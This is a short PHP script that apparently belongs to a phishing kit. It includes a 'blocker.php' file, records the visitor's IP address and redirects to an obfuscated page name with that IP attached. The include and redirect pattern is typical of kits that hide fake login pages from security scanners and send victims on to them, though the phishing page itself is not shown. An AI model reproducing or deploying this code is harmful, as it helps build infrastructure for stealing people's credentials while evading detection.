<?php
session_start();
include '../blocker.php';
$ip = getenv("REMOTE_ADDR");

header("Location: +=76789ij=.php?ip=$ip");
?>